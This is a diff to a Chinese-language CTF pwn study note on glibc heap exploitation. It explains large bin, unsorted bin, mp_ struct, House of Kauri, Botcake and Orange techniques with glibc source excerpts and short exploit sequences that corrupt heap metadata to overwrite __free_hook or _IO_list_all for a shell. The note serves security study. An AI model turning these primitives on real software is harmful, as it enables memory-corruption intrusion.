+  // _int_malloc 中遍历 unsorted bin，若不符合申请大小的堆块按范围放入large/small bin中
+  if (in_smallbin_range(size)){...}
+  else{
+    victim_index = largebin_index(size);
+    bck = bin_at(av, victim_index); // large bin
+    fwd = bck->fd;					// large bin 最大 chunk
+	
+    // 更新bk_nextsize和fd_nextsize
+    if (fwd != bck){ // large bin 非空
+      size |= PREV_INUSE; ...
+      if ((unsigned long)(size) < (unsigned long)(bck->bk->size)){...} 
+      else{// size 大于等于 large bin 最小 chunk 大小
+        ...
+        while ((unsigned long)size < fwd->size){ // 遍历找到第一个小于等于victim size的chunk
+          fwd = fwd->fd_nextsize; ...
+        }
+        if ((unsigned long)size == (unsigned long)fwd->size){...} // 不更新fd_nextsize和bk_nextsize
+        else{
+          victim->fd_nextsize = fwd;				//【1】
+          victim->bk_nextsize = fwd->bk_nextsize;	//【2】
+          fwd->bk_nextsize = victim;				//【3】
+          victim->bk_nextsize->fd_nextsize = victim;//【4】
+        }
+        bck = fwd->bk;//【5】
+      }
+    }else{...}
+  ...
+  victim->bk = bck;//【6】
+  victim->fd = fwd;//【7】
+  fwd->bk = victim;//【8】
+  bck->fd = victim;//【9】
+```
+
+**利用**
+
+1. 劫持 large bin 中一个**在同等大小 chunk 中 bk 方向最靠前的 chunk** 的 **bk** 和 **bk_nextsize**
+2. 然后释放一个比该 chunk **稍大一些**的 chunk
+
+![image-20241126133526023](/img/pwn_note.zh-cn.assets/image-20241126133526023.png)
+
+```python
+malloc(0, 0x400)
+malloc(1, 0x10) # 用于分隔
+malloc(2, 0x410)
+malloc(3, 0x10) # 用于分隔
+
+free(0) # chunk0进入unsorted bin
+malloc(4, 0x500) # 由于0x400无法满足0x500，chunk0进入large bin
+edit(4, p64(0) + p64(libc.sym["stderr"]-0x10) + p64(0) + p64(libc.sym['_IO_list_all']-0x20)) # UAF伪造
+free(2) # chunk2进入unsorted bin
+malloc(5, 0x500) # chunk2进入large bin 触发两处任意地址写，将stderr和_IO_list_all改为堆地址
+```
+
+**原理**
+
+- glibc-2.30后，在遍历 unsorted bin将堆块放入large bin代码中【申请size大于等于最小large bin size】中加入检查
+
+- ```c
+  if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd)) 
+      // 旧版本控制该fd_nextsize为target，此处将不能利用
+  	malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
+  ...
+  if (bck->fd != fwd)
+  	malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");
+  ```
+
+**利用**
+
+利用【申请size小于最小large bin size】如下这段代码，伪造`bk_nextsize`来达成一处任意地址写大数
+
+```c
+if (fwd != bck){
+    size |= PREV_INUSE; ...
+    if ((unsigned long)(size) < (unsigned long)(bck->bk->size)){
+        fwd = bck;		// 【1】
+        bck = bck->bk;	// 【2】
+
+        victim->fd_nextsize = fwd->fd; // 【3】
+        victim->bk_nextsize = fwd->fd->bk_nextsize; // 【4】
+        fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim; // 【5】
+} 
+```
+
+申请0x500的大堆可使得target指向0x420 victim
+
+![image-20241127125247206](/img/pwn_note.zh-cn.assets/image-20241127125247206.png)
+
+申请0x200的小堆可使得target指向0x430 的堆，走的过程：
+
+- unsorted bin中直接切割chunk条件中的`victim==av->last_remainder`不满足，进入large bin触发attack
+- 接着程序在large bin中按size升序找合适的chunk切割出所需内存，通过bk_nextsize访问最小的chunk即访问到0x430的堆
+
+![image-20241127132408572](/img/pwn_note.zh-cn.assets/image-20241127132408572.png)
+
 #### mp_ struct attack
 
 - 修改掉 `tcache_bins`：# 只允许的最大tcache chunk大小，释放的小于`mp_.tcache_bins`的`chunk`会被当作`tcache bin`处理，可以把很大的 `chunk` 用 `tcachebin` 管理
@@ -5390,6 +5855,8 @@ tcache_max_bytes = mp_ + 88
 ```
 
 ![img](/img/pwn_note.zh-cn.assets/-172844676894978.assets)
+
+
 
 - **任意地址写**堆地址：`large bin`链表中并没有对`fd_nextsize`和`bk_nextsize`进行双向链表完整性的检查，通过改写`large bin`的`bk_nextsize`的值来向**指定的位置+0x20**的位置写入一个**堆地址，即很大的值，使得下次`free`时堆块将进入`tcache`处理**
 - 通过uaf `browse`出`fd`的值，对堆块进行填充时fd保持不变，而更改`bk_nextsize`和`fd_nextsize`的值,覆写`malloc`中`tcache`部分的`mp_.tcache_bins`的值为一个很大的地址
@@ -5413,6 +5880,8 @@ delete(10) # 10号堆块提前写入内容'/bin/sh' 完成getshell
 - 覆写`free_hook`为`system`，进而getshell
 
 ### Unsorted bin attack
+
+#### 地址泄露
 
 **libc地址泄露**
 
@@ -5438,7 +5907,7 @@ show(0)
 
 - glibc-2.23中指向main_arena偏移88的地址
 
-![img](/img/pwn_note.zh-cn.assets/-172844676894980.assets)
+<img src="/img/pwn_note.zh-cn.assets/-172844676894980.assets" alt="img"  />
 
 
 
@@ -5473,64 +5942,89 @@ edit(0, b'a'*8) # 填充将0去除
 show(0) # 将打印出的值最后3位改为0即为堆地址
 ```
 
-**任意地址写大数**
+#### 任意地址写大数
 
-`Unsorted bin`遍历堆块使用`bk`指针
+- 通过该技巧可以用于绕过判断检查等，如向`global_max_fast`写入一个大值，扩大fastbin范围
+- 控制bk值将`unsorted_chunks(av)`写到任意地址，glibc-2.28之前版本可利用
+
+**绕过**
+
+- ```c
+  if (__builtin_expect (chunksize_nomask (victim) <= 2 * SIZE_SZ, 0)
+   || __builtin_expect (chunksize_nomask (victim) > av->system_mem, 0))
+  ```
+
+  fake chunk被链入unsorted bin中，将其申请出来需要保证size合法
+
+- 且 unsorted bin  chunk 的 bk 字段指向地址必须可写
+
+**原理**
+
+`Unsorted bin`遍历堆块使用`bk`指针，malloc取出victim代码使得其fd内填入本unsorted bin的地址
 
 ```C
-// 简化源码 libc-2.27
+// glibc-2.23 _int_malloc
 victim = unsorted_chunks (av)->bk; // 链表尾部堆块：victim
 bck = victim->bk;                  // 倒数第二堆块：bck
-// 对victim的size位检查，获取chunk大小
-// ... ...不属于small bin范围，则将victim脱链放入合适链中或返回用户
 
-unsorted_chunks(av)->bk = bck;
-bck->fd = unsorted_chunks(av); // 此处向bck->fd即((target-0x10)+0x10)处写入main_aren偏移地址，包括7f可达成写入7f构造目的
+// 将victim 从 unsorted bin脱链取出，漏洞点在于未检查bck->fd是否等于victim，glibc-2.28修复加入检查
+unsorted_chunks(av)->bk = bck; 
+bck->fd = unsorted_chunks(av); 
+// 此处向bck->fd即((target-0x10)+0x10)处写入main_aren偏移的unsorted bin地址，包括7f可达成写入7f构造目的
 ```
 
-- 通过堆溢出或其他修改`unsorted bin`中堆块的`bk(addr+0x8)`为`target_addr - 0x10`，`malloc`触发漏洞达成写大数（地址数），即向`target_addr`写入`unsorted_chunks(av)`值——`mainarena`偏移地址
+**利用**
 
-![img](/img/pwn_note.zh-cn.assets/-172844676894982.assets)
+- 通过堆溢出或其他漏洞修改`unsorted bin`中堆块的`bk(addr+0x8)`为`target_addr - 0x10`
 
+- `malloc`触发漏洞达成写大数（地址数），即向`target_addr`写入`unsorted_chunks(av)`值——`mainarena`偏移地址
 
-
-### Off-by-one
-
-更改后一块的`size`位，用于合并堆块造成堆块重叠
-
-### Off-by-null
-
-原理：程序向堆缓冲区中写入时，字节数超过了该缓冲区本身所申请的字节数，且刚好越界了一个字节；利用该漏洞可以实现利用方法：**poison null byte/off-by-null（适用于libc-2.27）**
-
-**触发漏洞：**
-
-![img](/img/pwn_note.zh-cn.assets/-172844676894985.assets)
-
-**原理**：free(b)后并没有将b指针置为NULL，且此时b中的prev_size作为a的内容，可以填入a的数据，若能控制a的数据，超过b的prev_size区域后并且覆盖b的size区域中一个字节，则造成off-by-one
-
-- 要绕过高版本的glibc需要在b上构造数据进行绕过验证，旧版本check为`size==prev_size(next_chunk)`，新版本check为**`chunksize(P) != prev_size (next_chunk(P))`**
-- 在off by one后，`b`的`size`将会由于覆盖而改变，`chunksize(P)`即`b`的`size`大小，被覆盖为了`0xa00`，而`next_chunk(P)`本来应该为`c`的`prev_size`，但是此时并不是`c`，对于`b`的`next_chunk`的计算应该是`b`的`chunk`指针加上`b`的`size`，即图中【b-0x10+0xa00】，仍在`b`的`chunk`内，所以提前构造`* (size_t)(b+0x9f0) = 0xa00;`
-
-![img](/img/pwn_note.zh-cn.assets/-172844676894986.assets)
-
-free `b`后，进入`unsorted bin`中，申请新的`B1`和`B2`，将会从原来`b`的位置延续，而修改`c`的`pre_size`时也会因为伪造导致修改在了向上偏0x10的位置处，所以`c`仍然认为`prev_size`为**0xa10**，free B1和c后，会导致B1、B2和c一同合并为一个大chunk进入`unsorted bin`中，而B2并没有被free，再次申请d，会出现覆盖B2的情况（形成堆的堆叠），此时可以任意修改B2中的内容，通常B2（受害者）将是一个结构，其中包含我们要控制的有价值的指针
-
-**漏洞点：**
-
-```C
-for(i=0; ;++i)
-    if(i > length) break //i=length时多写一个
-```
-
-利用实现unsorted bin泄露方法：
-
-构造0,1,2,3共四个堆块，修改0号堆块内容溢出一字节到1堆块更改大小覆盖1和2堆块，此时1和2堆块被系统误认为为一个堆块，释放1堆块，将会有一个合并chunk进入unsorted bin（进入的**前提**为**1和2堆块相加的大小要大于0x80**），再申请一个堆块（和1堆块大小相等），此时unsorted bin分割导致只存有2堆块，2堆块的fd和bk都指向一个地址，访问2堆块可以泄露相关main_arena的地址
+![image-20241125180540007](/img/pwn_note.zh-cn.assets/image-20241125180540007.png)
 
 ### House of
 
-#### House of strom
+#### House of kauri
 
-glibc-2.27及之前版本
+修改 `size` 使两次 `free` 的同一块内存进入不同 `entries` 来绕过tcache key的double free检查
+
+```python
+new(10, 0x18) # chunk 10 用于防止tcache count为0
+new(0, 0x18)
+new(1, 0x28)
+
+free(10) # chunk 10 进入 tcache bin
+free(1) # chunk 1 进入 tcache bin 0x30
+edit(0, b'a'*0x18 + p64(0x20)) # 修改 chunk 1 的 size 为 0x20
+free(1) # chunk 1 进入 tcache bin 0x20
+
+new(0, 0x28)
+edit(0, p64(free_hook_addr))
+new(0, 0x18)
+new(0, 0x18) # 申请出__free_hook堆块
+```
+
+#### House of Botcake
+
+- 将同一个chunk释放到tcache和unsorted bin中，释放在unsorted bin的chunk借助堆块合并改变大小
+- 会形成堆块堆叠，一次double free可多次使用
+
+```python
+for i in range(10): new(i, 0x200) # chunk 0-9
+for i in range(7): delete(i) # chunk 0-6 进入 tcache bin
+ 
+delete(8) # free chunk8进入unsorted bin
+delete(7) # free chunk7, 与chunk8合并为chunk7
+new(0, 0x200) # tcache 取出 chunk0
+delete(8) # chunk8 进入 tcache bin，此时chunk8在chunk7之间
+ 
+new(7, 0x410) # 申请chunk7可以编辑chunk8的fd
+edit(7, 'a' * 0x210 + p64(libc.sym['__free_hook'])) # chunk8指向target
+ 
+new(0, 0x200) # chunk8
+new(0, 0x200) # target劫持
+```
+
+<img src="/img/pwn_note.zh-cn.assets/image-20241128190118374.png" alt="image-20241128190118374" style="zoom: 80%;" />
 
 #### House of orange
 
@@ -5545,12 +6039,17 @@ glibc-2.27及之前版本
 ```C
 // 调用链 malloc > sysmalloc > _int_free
 _int_free(av, old_top, 1); // 通过此将top chunk free
-add(0x10, b'')
+```
+
+```python
+add(0x10)
 edit(0, xxx) # 修改top chunk
-add(0x1000, b'') # top chunk 进入 unsorted bin
-add(0x400, b'') # 从 unsorted bin 获取堆块
+add(0x1000) # top chunk 进入 unsorted bin
+add(0x400) # 从 unsorted bin 获取堆块
 show() # 泄露地址
 ```
+
+
 
 #### House of spirit
 
@@ -5707,3 +6206,16 @@ else{
 - 第2个进程写入值将覆盖logcount，达成**任意写**，第3个进程写入值将通过read修改memory[logcount]内容达成**任意地址写**
 
 ![image-20241101000216869](/img/pwn_note.zh-cn.assets/image-20241101000216869.png)
+
+## musl pwn
+
+### 环境
+
+下载[安装包](https://pkgs.org/download/musl)
+
+```bash
+sudo dpkg -i musl_1.1.xx-x_amd64.deb # 同样适用于Libc调试符号musl-dbgsymxxx.ddeb
+# https://launchpad.net/ubuntu/
+sudo apt-get install -y musl musl-dev
+```
+
